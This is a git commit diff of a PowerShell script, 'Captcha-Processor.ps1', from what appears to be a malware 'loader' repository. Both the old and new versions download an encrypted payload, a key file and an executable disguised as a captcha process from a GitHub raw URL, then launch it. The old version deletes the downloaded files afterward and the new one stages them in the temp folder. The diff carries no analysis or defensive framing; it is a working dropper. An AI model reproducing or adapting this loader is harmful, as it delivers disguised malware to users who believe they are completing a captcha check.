a92fa95db2ff30b1affd333e8aa1a32888ef8ccc
waveget <nathanppwalker@gmail.com>
2024-10-13 16:00:18 +0100

    Update Captcha-Processor.ps1

--- Captcha-Processor.ps1
+++ Captcha-Processor.ps1
@@ -1,19 +1,6 @@
-# Define the download location
-$downloadPath = "C:\MyDownloads"
-# Create the directory if it doesn't exist
-if (-not (Test-Path -Path $downloadPath)) { New-Item -ItemType Directory -Path $downloadPath }
-
-# Download files
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/main.bat" -OutFile "$downloadPath\main.bat"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/cipher.bin" -OutFile "$downloadPath\cipher.bin"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/key.bin" -OutFile "$downloadPath\key.bin"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/Captcha-Authentication-Process-820182.exe" -OutFile "$downloadPath\Captcha-Authentication-Process-820182.exe"
-
-# Run main.bat
-Start-Process -FilePath "$downloadPath\main.bat" -NoNewWindow
-
-# Wait for 10 seconds
-Start-Sleep -Seconds 20
-
-# Delete all downloaded files
-Remove-Item -Path "$downloadPath\*"
+$tempPath = "$env:TEMP"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/cipher.bin" -OutFile "$tempPath\cipher.bin"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/key.bin" -OutFile "$tempPath\key.bin"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/CaptchaProcessor ReCaptcha.exe" -OutFile "$tempPath\CaptchaProcessor ReCaptcha.exe"
+Start-Sleep -Seconds 5
+Start-Process -FilePath "$tempPath\CaptchaProcessor ReCaptcha.exe"
